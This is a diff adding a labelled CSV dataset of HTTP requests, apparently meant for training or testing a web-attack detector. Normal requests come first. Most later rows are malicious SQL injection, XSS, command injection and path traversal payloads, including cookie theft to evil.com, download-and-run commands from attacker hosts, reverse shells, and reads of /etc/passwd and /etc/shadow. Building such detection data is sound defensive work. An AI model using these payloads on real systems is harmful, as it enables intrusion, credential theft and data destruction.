@@ -1,0 +1,175 @@
+request,label,attack_type
+GET / HTTP/1.1,NORMAL,NORMAL
+GET /index.html HTTP/1.1,NORMAL,NORMAL
+GET /products HTTP/1.1,NORMAL,NORMAL
+GET /products?category=electronics&sort=price_asc HTTP/1.1,NORMAL,NORMAL
+GET /products/123 HTTP/1.1,NORMAL,NORMAL
+GET /products/search?q=laptop+backpack HTTP/1.1,NORMAL,NORMAL
+GET /products/search?q=wireless+noise+cancelling+headphones HTTP/1.1,NORMAL,NORMAL
+GET /products/search?q=usb+c+hub+multiport+adapter HTTP/1.1,NORMAL,NORMAL
+GET /catalog/items?page=2&limit=20 HTTP/1.1,NORMAL,NORMAL
+GET /about-us HTTP/1.1,NORMAL,NORMAL
+GET /contact HTTP/1.1,NORMAL,NORMAL
+GET /faq HTTP/1.1,NORMAL,NORMAL
+GET /terms-of-service HTTP/1.1,NORMAL,NORMAL
+GET /privacy-policy HTTP/1.1,NORMAL,NORMAL
+GET /blog/cybersecurity-best-practices HTTP/1.1,NORMAL,NORMAL
+GET /static/css/main.css HTTP/1.1,NORMAL,NORMAL
+GET /static/js/bundle.js HTTP/1.1,NORMAL,NORMAL
+GET /static/images/logo.png HTTP/1.1,NORMAL,NORMAL
+GET /favicon.ico HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/health HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/status HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/users/profile HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/cart HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/orders/recent HTTP/1.1,NORMAL,NORMAL
+"POST /login HTTP/1.1
+Content-Type: application/json
+
+{""username"": ""john_doe"", ""password"": ""SuperSecretPass123!""}",NORMAL,NORMAL
+"POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=alice&password=SecurePassword456",NORMAL,NORMAL
+"POST /register HTTP/1.1
+Content-Type: application/json
+
+{""username"": ""new_user"", ""email"": ""user@example.com"", ""password"": ""StrongPass789!""}",NORMAL,NORMAL
+"POST /api/v1/cart/items HTTP/1.1
+Content-Type: application/json
+
+{""product_id"": 42, ""quantity"": 2}",NORMAL,NORMAL
+"POST /api/v1/checkout HTTP/1.1
+Content-Type: application/json
+
+{""shipping_address"": ""123 Tech Lane, Suite 400"", ""card_last4"": ""4242""}",NORMAL,NORMAL
+"POST /contact/feedback HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=Bob+Smith&email=bob@company.org&message=Great+customer+service+thank+you",NORMAL,NORMAL
+"PUT /api/v1/users/settings HTTP/1.1
+Content-Type: application/json
+
+{""theme"": ""dark"", ""notifications"": true}",NORMAL,NORMAL
+DELETE /api/v1/cart/items/42 HTTP/1.1,NORMAL,NORMAL
+GET /search?q=python+programming+fundamentals+edition+3 HTTP/1.1,NORMAL,NORMAL
+GET /search?q=european+union+trade+regulations+summary HTTP/1.1,NORMAL,NORMAL
+GET /search?q=select+color+options+for+winter+jackets HTTP/1.1,NORMAL,NORMAL
+GET /support/tickets/new?category=billing HTTP/1.1,NORMAL,NORMAL
+GET /reports/quarterly-summary-2025.pdf HTTP/1.1,NORMAL,NORMAL
+GET /api/v1/metrics?interval=1h&format=json HTTP/1.1,NORMAL,NORMAL
+GET /docs/api/swagger.json HTTP/1.1,NORMAL,NORMAL
+"POST /api/v1/subscriptions HTTP/1.1
+Content-Type: application/json
+
+{""plan"": ""enterprise"", ""billing_cycle"": ""annual""}",NORMAL,NORMAL
+GET /products?id=1%27%20OR%201=1-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+"GET /items?id=105%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",MALICIOUS,SQL_INJECTION
+"GET /search?q=laptop%27%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables-- HTTP/1.1",MALICIOUS,SQL_INJECTION
+GET /profile?user=admin%27%20OR%20%27a%27=%27a HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /orders?order_id=50%20ORDER%20BY%2010 HTTP/1.1,MALICIOUS,SQL_INJECTION
+"POST /login HTTP/1.1
+Content-Type: application/json
+
+{""username"": ""admin' OR 1=1--"", ""password"": ""anything""}",MALICIOUS,SQL_INJECTION
+"POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin%27+OR+1%3D1--&password=x",MALICIOUS,SQL_INJECTION
+GET /search?q=item%27;%20DROP%20TABLE%20users;-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /api/items?cat=1;%20EXEC%20xp_cmdshell('whoami');-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /products?id=1%20AND%20SLEEP(5)-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /users?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a) HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /search?q=%2527%2520OR%25201%253D1-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /items?name=test%27%20HAVING%201=1-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+"POST /api/v1/query HTTP/1.1
+Content-Type: application/json
+
+{""filter"": ""category' UNION SELECT cc_number, cvv FROM credit_cards--""}",MALICIOUS,SQL_INJECTION
+GET /catalog?cat=books%27%20OR%20(SELECT%20count(*)%20FROM%20admin)%3E0-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /data?id=1%20AND%201=(SELECT%20TOP%201%20table_name%20FROM%20information_schema.tables) HTTP/1.1,MALICIOUS,SQL_INJECTION
+GET /lookup?ip=127.0.0.1%27;%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1,MALICIOUS,SQL_INJECTION
+"GET /articles?tag=sec%27%20AND%20ASCII(SUBSTRING((SELECT%20USER()),1,1))=97-- HTTP/1.1",MALICIOUS,SQL_INJECTION
+GET /products?id=1/*inline_comment*/OR/*comment*/1=1 HTTP/1.1,MALICIOUS,SQL_INJECTION
+"POST /api/v1/feedback HTTP/1.1
+Content-Type: application/json
+
+{""comment"": ""Great'; INSERT INTO admins (user, pass) VALUES ('hacker', 'pwned');--""}",MALICIOUS,SQL_INJECTION
+GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%3Cscript%20src=%22http://attacker.com/evil.js%22%3E%3C/script%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /profile?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /welcome?msg=%3Csvg%20onload=alert(%27XSS%27)%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /preview?url=javascript:alert(document.domain) HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+"GET /link?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== HTTP/1.1",MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt; HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+"POST /comment HTTP/1.1
+Content-Type: application/json
+
+{""author"": ""guest"", ""text"": ""<script>document.location='http://evil.com/?c='+document.cookie</script>""}",MALICIOUS,CROSS_SITE_SCRIPTING
+"POST /comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+author=test&text=%3Cbody+onload%3Dalert%281%29%3E",MALICIOUS,CROSS_SITE_SCRIPTING
+GET /redirect?url=%3Ciframe%20src=%22javascript:alert(1)%22%3E%3C/iframe%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%3Ca%20href=%22javascript:alert(1)%22%3EClick%20Here%3C/a%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /index.php?param=%3Cinput%20type=%22text%22%20onfocus=%22alert(1)%22%20autofocus%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /test?input=%3Cdetails%20open%20ontoggle=alert(1)%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /page?name=%3Cobject%20data=%22javascript:alert(1)%22%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+"POST /api/v1/profile HTTP/1.1
+Content-Type: application/json
+
+{""bio"": ""<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>""}",MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%3Cbase%20href=%22http://attacker.com/%22%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /search?q=%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /lookup?q=%3Cscript%3Efetch(%27http://evil.com/%27%2Bdocument.cookie)%3C/script%3E HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /items?id=1%22%20onmouseover=%22alert(1)%22%20style=%22position:absolute;width:100%25;height:100%25 HTTP/1.1,MALICIOUS,CROSS_SITE_SCRIPTING
+GET /lookup?ip=127.0.0.1;%20whoami HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /lookup?ip=127.0.0.1;%20cat%20/etc/passwd HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /status?host=localhost%20|%20id HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /ping?target=127.0.0.1%20&&%20uname%20-a HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /exec?cmd=echo%20test%20|%20sh HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /service?name=test;%20curl%20http://attacker.com/malware.sh%20|%20bash HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /process?pid=100;%20powershell.exe%20-Command%20whoami HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /ping?host=127.0.0.1%20`whoami` HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /ping?host=127.0.0.1$(whoami) HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+"POST /api/v1/network/ping HTTP/1.1
+Content-Type: application/json
+
+{""destination"": ""127.0.0.1; cat /etc/shadow""}",MALICIOUS,COMMAND_INJECTION
+GET /tools/dns?host=8.8.8.8;%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /lookup?domain=google.com%20|%20base64%20-d HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /system?task=backup;%20rm%20-rf%20/var/log/* HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /run?action=check;%20bash%20-i%20>%20/dev/tcp/10.0.0.1/4444%202>&1 HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /diag?cmd=ipconfig%20&%20net%20user%20hacker%20Pass123!%20/add HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+"POST /diagnostics HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%3B+wget+http%3A%2F%2Fevil.com%2Fbot+-O+%2Ftmp%2Fbot",MALICIOUS,COMMAND_INJECTION
+GET /log?file=app.log;%20cat%20${IFS}/etc/passwd HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+"GET /check?host=127.0.0.1;%20python%20-c%20'import%20socket,subprocess,os;s=socket.socket()...' HTTP/1.1",MALICIOUS,COMMAND_INJECTION
+GET /report?id=123;%20ls%20-la%20/home HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /service?status=1;%20certutil.exe%20-urlcache%20-f%20http://evil.com/payload.exe HTTP/1.1,MALICIOUS,COMMAND_INJECTION
+GET /files?filename=../../../../etc/passwd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /view?doc=%252e%252e%252f%252e%252e%252fetc%2fshadow HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /images?path=..\..\windows\win.ini HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /docs?item=....//....//....//etc/passwd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /download?file=/var/www/../../etc/hosts HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /files?name=report.pdf%00.exe HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /files?filename=../../../../windows/system32/cmd.exe HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /api/v1/files/read?path=/proc/self/environ HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /api/v1/files/read?path=..%252f..%252f..%252fetc/passwd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /logs?name=../../../../boot.ini HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+"POST /api/v1/export HTTP/1.1
+Content-Type: application/json
+
+{""template"": ""../../../../etc/passwd""}",MALICIOUS,PATH_TRAVERSAL
+GET /static?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /load?template=..\..\..\..\windows\repair\sam HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /media?img=..//..//..//etc//passwd HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /download?file=../../../../proc/version HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /fetch?doc=test/../../../../etc/group HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /read?file=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /reports?filename=../../../conf/server.xml HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
+GET /attachments?file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts HTTP/1.1,MALICIOUS,PATH_TRAVERSAL
